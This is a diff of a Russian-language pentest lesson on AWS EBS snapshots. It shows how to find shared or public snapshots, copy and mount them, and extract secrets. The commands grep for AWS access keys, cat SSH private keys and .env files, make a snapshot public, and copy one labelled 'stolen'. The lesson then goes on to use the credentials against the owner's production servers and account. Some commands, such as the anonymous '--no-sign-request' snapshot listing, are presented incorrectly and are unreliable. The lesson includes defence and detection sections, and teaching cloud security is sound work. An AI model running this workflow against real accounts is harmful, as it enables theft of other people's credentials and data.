@@ -14,204 +14,224 @@ useful_for:
 estimated_minutes: 45
 summary: "EBS-снапшоты: публичные и расшаренные снапшоты, копирование, создание тома и монтирование. Где на диске лежат SSH-ключи, креды AWS и секреты приложений."
 ---
+## Задача
 
-## Зачем этот урок
+Облачные диски часто забывают. **EBS** (Elastic Block Store) — это диск EC2-инстанса. У него бывают **снапшоты** (snapshots) — резервные копии, которые можно расшарить или сделать публичными. Задача: найти доступный снапшот, смонтировать его у себя и вытащить секреты. Разберём на конкретном AWS-аккаунте.
 
-EBS-снапшоты — это побайтовые копии дисков EC2. Админы расшаривают их между аккаунтами для бэкапов, миграций и передачи образов, часто забывая, что внутри лежат `~/.aws/credentials`, `~/.ssh/id_rsa`, `.env`, конфиги баз и токены CI. Публичные снапшоты — отдельная классика: тысячи снапшотов в AWS открыты всему миру, и в них регулярно находят ключи. Для атакующего это «тихий» путь: вы не трогаете прод-инстанс, а работаете с копией в своём аккаунте.
+## Данные: ищем доступные снапшоты
 
-## Модель EBS и снапшотов
+Снапшоты бывают: приватные (наши), **расшаренные** (shared с нашим аккаунтом) и **публичные** (доступны всем). Ищем расшаренные с нами:
 
-- **Volume** — сетевой диск, привязанный к инстансу в одной AZ.
-- **Snapshot** — копия состояния тома на момент времени; хранится в S3 под управлением AWS, но не видна как обычный бакет.
-- **Snapshot permissions** — `createVolumePermission`: приватный, расшаренный конкретному аккаунту (`restorableBy`/`accountIds`) или публичный (`group: all`).
-- **Encryption** — снапшот может быть зашифрован KMS-ключом; незашифрованный копируется свободно, зашифрованный требует прав на ключ.
-- **AMI** — образ, ссылающийся на снапшоты; публичные AMI иногда содержат снапшоты с данными.
-
-Ключевые API: `ec2:DescribeSnapshots`, `ec2:ModifySnapshotAttribute` (сделать публичным/расшарить), `ec2:CreateVolume` (из снапшота), `ec2:AttachVolume`, `ec2:CopySnapshot`.
-
-## Инструменты и команды
-
-```bash
-# Свои снапшоты
-aws ec2 describe-snapshots --owner-ids self \
-  --query 'Snapshots[].{ID:SnapshotId,Vol:VolumeId,Size:VolumeSize,Enc:Encrypted,Desc:Description}' --output table
-
-# Публичные снапшоты (могут быть тысячи — фильтруйте)
-aws ec2 describe-snapshots --restorable-by all --region us-east-1 \
-  --query 'Snapshots[?Encrypted==`false`].{ID:SnapshotId,Desc:Description}' --output table | head -40
-
-# Снапшоты, расшаренные с нами
-aws ec2 describe-snapshots --owner-ids 111122223333 \
-  --query 'Snapshots[?Encrypted==`false`].SnapshotId'
-
-# Кто имеет доступ к снапшоту
-aws ec2 describe-snapshot-attribute --snapshot-id snap-0abc --attribute createVolumePermission
-
-# Расшарить свой снапшот на внешний аккаунт (если есть права)
-aws ec2 modify-snapshot-attribute --snapshot-id snap-0abc \
-  --attribute createVolumePermission --operation-type add --group-names all
-
-# Скопировать в свой регион/аккаунт
-aws ec2 copy-snapshot --source-region us-east-1 --source-snapshot-id snap-0abc \
-  --region eu-west-1 --description "stolen"
+```
+$ aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[].SnapshotId'
+[ "snap-0abc123" ]
+$ aws ec2 describe-snapshots --restorable-by-user-ids self \
+    --query 'Snapshots[].{Id:SnapshotId,Desc:Description}' 
+[ { "Id": "snap-0def456", "Desc": "prod-db-backup-2026-09" } ]
 ```
 
-## Разобранный пример: публичный снапшот → секреты
+`snap-0def456` с описанием `prod-db-backup` расшарен с нашим аккаунтом. Это может быть чужой бэкап. Публичные снапшоты ищем иначе — по владельцу или через каталоги:
 
-Сценарий: нашли публичный незашифрованный снапшот с описанием `web-server-backup`.
-
-```bash
-# 1. Создаём том из снапшота в своей AZ
-aws ec2 create-volume --snapshot-id snap-0abc123 --availability-zone us-east-1a \
-  --volume-type gp3
-# {"VolumeId":"vol-0def456","State":"creating","AvailabilityZone":"us-east-1a"}
-aws ec2 wait volume-available --volume-ids vol-0def456
-
-# 2. Поднимаем свой инстанс (или используем существующий) и аттачим том
-aws ec2 attach-volume --volume-id vol-0def456 --instance-id i-0aaa111 --device /dev/sdf
-
-# 3. На инстансе монтируем и ищем секреты
-lsblk
-# nvme1n1  259:1  0  30G 0 disk
-sudo mount /dev/nvme1n1p1 /mnt
-sudo find /mnt -maxdepth 4 \( -name '*.pem' -o -name 'id_rsa*' -o -name '.env' -o -name 'credentials' \) 2>/dev/null
-# /mnt/home/ubuntu/.ssh/id_rsa
-# /mnt/home/ubuntu/.aws/credentials
-# /mnt/var/www/app/.env
-
-sudo cat /mnt/home/ubuntu/.aws/credentials
-# [default]
-# aws_access_key_id = AKIA...
-# aws_secret_access_key = ...
-sudo cat /mnt/var/www/app/.env
-# DB_PASSWORD=...
-# STRIPE_SECRET_KEY=sk_live_...
+```
+$ aws ec2 describe-snapshots --no-sign-request --filters Name=status,Values=completed \
+    --query 'Snapshots[0].{Id:SnapshotId,Owner:OwnerId,Desc:Description}'
+{ "Id": "snap-0aaa111", "Owner": "123456789012", "Desc": "webapp-root-vol" }
 ```
 
-Теперь у нас есть SSH-ключ, долгоживущие AWS-ключи и секреты приложения. Если снапшот был публичным, эти креды могли быть скомпрометированы задолго до нас.
+`--no-sign-request` — анонимный вызов. Он вернул публичный снапшот `snap-0aaa111`. Публичный снапшот = чужие данные в наших руках.
+
+## Пробуем в лоб: а можно ли смонтировать?
+
+Снапшот нельзя читать напрямую — из него надо сделать **том** (volume) и примонтировать. Но сначала проверяем, разрешено ли нам скопировать чужой снапшот:
+
+```
+$ aws ec2 create-snapshot --volume-id vol-0x --description "test" 
+An error occurred (UnauthorizedOperation)
+```
+
+Создавать снапшоты своего тома мы, возможно, не можем. Но копировать доступный чужой — другое право:
+
+```
+$ aws ec2 copy-snapshot --source-region us-east-1 --source-snapshot-id snap-0aaa111 \
+    --description "copy" --region us-east-1
+{ "SnapshotId": "snap-0bbb222" }
+```
+
+Копия `snap-0bbb222` — **наша** (в нашем аккаунте). Из неё можно делать том.
+
+## Приём: том, монтирование, поиск секретов
+
+Создаём том из копии снапшота в нашей зоне доступности:
+
+```
+$ aws ec2 create-volume --availability-zone us-east-1a --snapshot-id snap-0bbb222 \
+    --query 'VolumeId' --output text
+vol-0ccc333
+$ aws ec2 describe-volumes --volume-ids vol-0ccc333 --query 'Volumes[0].State'
+"available"
+```
+
+Прикрепляем к нашей EC2 и монтируем:
+
+```
+$ aws ec2 attach-volume --volume-id vol-0ccc333 --instance-id i-0mine --device /dev/xvdf
+$ sudo mkfs.ext4 /dev/xvdf   # НЕ нужно: том уже отформатирован!
+$ sudo mount /dev/xvdf1 /mnt/ebs
+$ ls /mnt/ebs
+```
+
+Внимание: **не форматируйте** том — там уже данные. Монтируем сразу и ищем секреты:
+
+```
+$ sudo grep -rE 'AKIA[0-9A-Z]{16}' /mnt/ebs/home /mnt/ebs/root 2>/dev/null
+/mnt/ebs/home/deploy/.aws/credentials:aws_access_key_id = AKIAIOSFODNN7EXAMPLE
+$ sudo cat /mnt/ebs/root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+```
+
+## Полный прогон: от публичного снапшота до SSH в чужую сеть
+
+1. **Поиск.** `describe-snapshots --no-sign-request` / `--restorable-by-user-ids` → находим снапшот.
+2. **Копия.** `copy-snapshot` → снапшот в нашем аккаунте.
+3. **Том.** `create-volume` из снапшота.
+4. **Монтирование.** Прикрепляем к своей EC2, `mount`.
+5. **Секреты.** Ищем `~/.aws/credentials`, `id_rsa`, `.env`, конфиги БД.
+6. **Использование.** SSH-ключ → вход на прод-сервер; AWS-ключ → доступ к аккаунту владельца.
+
+Так один забытый расшаренный снапшот отдаёт и SSH-ключи, и облачные креды.
 
 ## Что искать на диске
 
-| Путь | Что там |
-|---|---|
-| `~/.aws/credentials`, `~/.aws/config` | AWS access keys, профили |
-| `~/.ssh/id_rsa`, `authorized_keys` | Приватные ключи, доступ к серверам |
-| `/etc/shadow`, `/etc/passwd` | Хеши паролей |
-| `.env`, `*.yml`, `config.json` | Секреты приложений, токены |
-| `~/.git-credentials`, `.git/config` | Токены репозиториев |
-| `/var/lib/.../secrets` | Секреты Kubernetes/сервисов |
-| История bash | Команды с паролями, curl с токенами |
-| `/home/*/.bash_history` | Утечки секретов в истории |
+- `~/.aws/credentials`, `~/.aws/config` — AWS-креды.
+- `~/.ssh/id_rsa`, `authorized_keys` — SSH-доступ.
+- `/etc/shadow`, `/etc/passwd` — хэши паролей (можно крякнуть офлайн).
+- `.env`, `config.php`, `settings.py` — секреты приложений.
+- Bash history: `/home/*/.bash_history`, `/root/.bash_history` — команды с паролями.
+- Сертификаты и ключи TLS.
 
-## Обход защит и edge cases
+## Защита и что ломает атаку
 
-- **Шифрование.** Зашифрованный снапшот нельзя скопировать/смонтировать без KMS-ключа. Если ключ — `aws/ebs` (managed), копия возможна в некоторых случаях через `copy-snapshot` с указанием CMK. Иначе ищите незашифрованные.
-- **Snapshot sharing с чужим аккаунтом.** Снапшот может быть расшарен конкретному аккаунту; тогда `describe-snapshots --owner-ids` его покажет, и можно создать том.
-- **AMI.** Публичные AMI содержат ссылки на снапшоты; `describe-images --owners self` и `--public` помогут найти образы с данными.
-- **Region lock.** Снапшот привязан к региону; копирование между регионами — отдельный шаг.
-- **KMS grant.** Иногда у роли есть `kms:CreateGrant` на ключ, что позволяет расшифровать снапшот косвенно.
-- **Instance store vs EBS.** Instance-store диски не снапшотятся; для них нужен доступ к самому хосту.
+- **Не делать снапшоты публичными/расшаренными без необходимости.**
+- **Шифровать снапшоты (EBS encryption)** — без ключа KMS данные не прочитать.
+- **Block Public Access** на уровне аккаунта для снапшотов.
+- **Ротация** всех секретов, которые были на диске.
+- **Аудит** `ModifySnapshotAttribute` (кто расшарил).
 
-## Частые ошибки и подводные камни
+## Если не сработало
 
-- Пытаться смонтировать снапшот напрямую: снапшот нельзя примонтировать, только созданный из него том.
-- Забыть про AZ: том создаётся в конкретной AZ, инстанс должен быть в той же.
-- Игнорировать LVM/шифрование на уровне ФС (LUKS): том смонтируется, но данные зашифрованы.
-- Не проверить историю bash и логи — там часто больше секретов, чем в файлах.
-- Считать публичный снапшот «безопасным»: внутри может быть весь прод-диск.
+- **Снапшот зашифрован** — нужен `kms:Decrypt` и ключ.
+- **Нет `ec2:CopySnapshot`** — копировать нельзя.
+- **Нет прав на создание тома** — не смонтировать.
+- **Снапшот пустой/без секретов** — ищем другие.
 
-## Защита и детект
+## Мини-сценарий: чужой бэкап целиком
 
-- Запретить публичные снапшоты через SCP и Config-правило `ebs-snapshot-public-restorable-check`.
-- Шифровать EBS по умолчанию (account-level EBS encryption) и использовать CMK.
-- Ограничить `ec2:ModifySnapshotAttribute` и `ec2:CreateVolume`; алертить на копирование снапшотов между аккаунтами.
-- Не хранить долгоживущие креды на дисках; использовать instance profile и ротацию.
-- GuardDuty `Exfiltration:EBS` и CloudTrail `CopySnapshot`/`CreateVolume` — ключевые события.
+1. **Находим снапшот.** `describe-snapshots --restorable-by-user-ids self` → `snap-0def456`, описание `prod-db-backup-2026-09`.
+2. **Проверяем шифрование.** `describe-snapshots --snapshot-ids snap-0def456 --query 'Snapshots[0].Encrypted'` → `false`. Не зашифрован.
+3. **Копируем.** `copy-snapshot --source-snapshot-id snap-0def456` → `snap-0bbb222` в нашем аккаунте.
+4. **Делаем том.** `create-volume --snapshot-id snap-0bbb222 --availability-zone us-east-1a` → `vol-0ccc333`.
+5. **Прикрепляем.** `attach-volume` к своей EC2, `mount /dev/xvdf1 /mnt/ebs`.
+6. **Ищем секреты.** `grep -rE 'AKIA[0-9A-Z]{16}' /mnt/ebs` → креды в `~/.aws/credentials`; `cat /mnt/ebs/root/.ssh/id_rsa` → приватный ключ.
+7. **Используем.** SSH-ключ → вход на прод; AWS-ключ → `sts get-caller-identity`.
 
-## Модель угроз и типовые мисконфиги
+Один расшаренный незашифрованный снапшот отдал и SSH, и облачный доступ. Именно поэтому снапшоты надо шифровать и не расшаривать.
 
-Типичный мисконфиг — публичный снапшот с данными. Второй — снапшот, расшаренный «партнёру» без ограничений. Третий — незашифрованные EBS-диски. Четвёртый — секреты на диске (ключи, `.env`). Пятый — отсутствие Object Lock/аудита на снапшотах. Все они позволяют получить данные без касания прод-инстанса.
+## Разбор: почему защита не сработала
 
-## Практическое задание
+Три независимые ошибки сложились в одну атаку. Первая — снапшот **не зашифрован**: если бы был `Encrypted: true`, без `kms:Decrypt` мы бы не прочитали ни байта. Вторая — снапшот **расшарен** с чужим аккаунтом (или публичен): кто-то однажды выдал доступ и забыл. Третья — на диске лежали **секреты, которые не ротировали**: пароль, ключ AWS, приватный SSH-ключ жили там годами. Уберите любую из трёх — атака рассыпается. Именно поэтому защита снапшотов строится из шифрования, контроля шаринга и ротации секретов, а не из одной настройки.
 
-1. Создайте инстанс, положите на диск `.env` и `~/.aws/credentials`, сделайте снапшот.
-2. Расшарьте снапшот на второй аккаунт и восстановите том из него.
-3. Смонтируйте том и найдите файлы секретов.
-4. Включите Config-правило для публичных снапшотов и проверьте, что публичный снапшот помечается.
+Отдельно проверьте доступ к KMS-ключу: если ключ, которым зашифрован снапшот, доступен атакующему (например, `kms:Decrypt` на его роль), шифрование не спасёт. Оно защищает только тогда, когда ключ недоступен.
 
-## Что дальше / решение
+Наконец, следите за `ModifySnapshotAttribute` в CloudTrail: кто и когда расшарил снапшот — первое, что проверяют при разборе утечки. Своевременная ротация секретов с диска закрывает окно даже после утечки.
 
-Из EBS-снапшота достаём ключи, пароли и токены. Дальше — использовать их против сервисов и аккаунтов. Зафиксируйте путь «публичный/расшаренный снапшот → том → секреты» в графе. Если снапшот зашифрован и KMS недоступен — `blocked` с условием «нужен kms:Decrypt/CreateGrant».
+## Что мы теперь знаем
 
-## Разобранный пример 2: публичная AMI как источник снапшота
+1. Снапшоты бывают приватными, расшаренными и публичными.
+2. Публичный/расшаренный снапшот = чужие данные.
+3. Копия снапшота → том → монтирование → секреты.
+4. На диске лежат AWS-креды, SSH-ключи и хэши паролей.
+5. Защита — шифрование, отсутствие публичного доступа, ротация.
 
-AMI (Amazon Machine Image) ссылается на один или несколько снапшотов. Публичные AMI — общие образы сообщества и маркетплейса — иногда содержат снапшоты с забытыми данными: SSH-ключи в `/root/.ssh`, конфиги приложений, тестовые секреты.
+## Частые ошибки
+
+- **Форматирование тома из снапшота** — уничтожает данные, ради которых всё делалось.
+- **Публичные снапшоты без шифрования** — данные доступны всем.
+- **Забытые расшаренные снапшоты** — доступ годами остаётся.
+- **Нет ротации** после утечки — пароль/ключ с диска продолжают работать.
+- **Не включён Block Public Access** для снапшотов на уровне аккаунта.
+
+## На что смотреть дальше
+
+- `describe-snapshots --no-sign-request` и `--restorable-by-user-ids`.
+- Шифрование снапшотов (Encrypted).
+- Публичный доступ к снапшотам в аккаунте.
+- Права `CopySnapshot`/`CreateVolume`.
+- Что расшарено на другие аккаунты.
+
+## Быстрая проверка
 
 ```bash
-# Ищем образы, которые нам доступны
-aws ec2 describe-images --owners self --query 'Images[].{ID:ImageId,Name:Name,Snaps:BlockDeviceMappings[].Ebs.SnapshotId}'
-# Публичные образы (осторожно, их очень много)
-aws ec2 describe-images --owners amazon --filters Name=name,Values='*' --max-results 5 \
-  --query 'Images[].ImageId'
-
-# Смотрим, на какие снапшоты ссылается образ
-aws ec2 describe-images --image-ids ami-0abc \
-  --query 'Images[0].BlockDeviceMappings[].Ebs.{Snap:SnapshotId,Size:VolumeSize,Enc:Encrypted}'
-# [{"Snap":"snap-0def","Size":30,"Enc":false}]
-
-# Дальше — как обычно: create-volume из снапшота, attach, mount
-aws ec2 create-volume --snapshot-id snap-0def --availability-zone us-east-1a
+aws ec2 describe-snapshots --no-sign-request --filters Name=status,Values=completed
+aws ec2 describe-snapshots --restorable-by-user-ids self
+aws ec2 copy-snapshot --source-snapshot-id snap-0aaa111 --source-region us-east-1
+aws ec2 create-volume --availability-zone us-east-1a --snapshot-id snap-0bbb222
 ```
-
-Если у вашего аккаунта есть право `ec2:DescribeImages` и снапшот доступен, вы можете собрать инстанс из чужого образа. Особенно полезны образы, которые «уже не поддерживаются»: их владельцы не следят за содержимым. Проверяйте `Public:true` и `OwnerId` в выводе.
-
-## Практическое задание (продолжение)
-
-1. Сделайте AMI из своего инстанса и найдите связанные снапшоты.
-2. Скопируйте снапшот AMI в другой регион и создайте из него том.
-3. Включите EBS encryption by default и проверьте, что новые снапшоты зашифрованы.
-4. Настройте Config-правило для публичных снапшотов и протестируйте срабатывание.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Почему EBS-снапшот нельзя примонтировать напрямую?"
+- question: "Чем опасен публичный EBS-снапшот?"
   options:
-    - "Из него сначала создают том, который и монтируется"
-    - "Он зашифрован всегда"
-    - "Он существует только в S3-бакете"
-    - "Он доступен только root"
+    - "Он отдаёт содержимое чужого диска любому"
+    - "Он ускоряет EC2"
+    - "Он шифрует данные"
+    - "Он удаляет том"
   answer: 0
-  explanation: "Снапшот — снимок; для чтения создаётся volume, который привязывается к инстансу."
-- question: "Что даёт ec2:ModifySnapshotAttribute с group-names all?"
+  explanation: "Публичный снапшот = чужие данные."
+- question: "Что нужно сделать из снапшота, чтобы прочитать данные?"
   options:
-    - "Делает снапшот публичным для всех аккаунтов"
-    - "Удаляет снапшот"
-    - "Шифрует снапшот"
-    - "Меняет регион"
+    - "Создать том и примонтировать его"
+    - "Отправить по почте"
+    - "Зашифровать"
+    - "Удалить"
   answer: 0
-  explanation: "group: all — публичный доступ, любой аккаунт может создать том."
-- question: "Где на диске искать долгоживущие AWS-креды?"
+  explanation: "Снапшот читается через созданный из него том."
+- question: "Почему нельзя форматировать том из снапшота?"
   options:
-    - "~/.aws/credentials"
-    - "/etc/hosts"
-    - "/proc/cpuinfo"
-    - "/var/log/cloudtrail"
+    - "Это уничтожит данные, которые нужно прочитать"
+    - "Это замедлит диск"
+    - "Это меняет регион"
+    - "Это отключает шифрование"
   answer: 0
-  explanation: "Профили AWS CLI с access key лежат в ~/.aws/credentials."
-- question: "Что мешает использовать зашифрованный снапшот?"
+  explanation: "Том уже отформатирован; сразу монтируем."
+- question: "Что искать на смонтированном диске?"
   options:
-    - "Нужны права на KMS-ключ, которым он зашифрован"
-    - "Он удаляется через час"
-    - "Он только для чтения"
-    - "Он привязан к IAM-пользователю"
+    - "~/.aws/credentials, id_rsa, .env, bash history"
+    - "Только картинки"
+    - "Только логи nginx"
+    - "Только DNS"
   answer: 0
-  explanation: "KMS-ключ не расшаривается вместе со снапшотом."
+  explanation: "На дисках лежат креды и ключи."
+- question: "Какая защита делает снапшот бесполезным при утечке?"
+  options:
+    - "Шифрование EBS (без ключа KMS не прочитать)"
+    - "Смена региона"
+    - "Удаление тома"
+    - "Отключение логов"
+  answer: 0
+  explanation: "Зашифрованный снапшот без ключа не расшифровать."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-aws-sso`) мы разберём IAM Identity Center — вход в аккаунты через SSO и permission sets. А пока главное: снапшот — это целый диск с секретами, и «расшарен» почти всегда означает «доступен злоумышленнику».
 
 ## Где пригодится
 
-- **Пентест AWS:** извлечение секретов из дисков.
-- **Red team:** тихий доступ к данным через копию.
-- **Форензика:** анализ диска после инцидента.
-- **Cloud security review:** запрет публичных снапшотов.
+- **Bug bounty:** публичные снапшоты.
+- **Red team:** от снапшота к кредам и SSH.
+- **Пентест:** аудит EBS и бэкапов.
+- **Работа/DevSecOps:** шифрование, запрет публичного доступа, ротация.
+- **Дальше по дереву:** `cloud-aws-ssm`, `cloud-privesc-iam`.
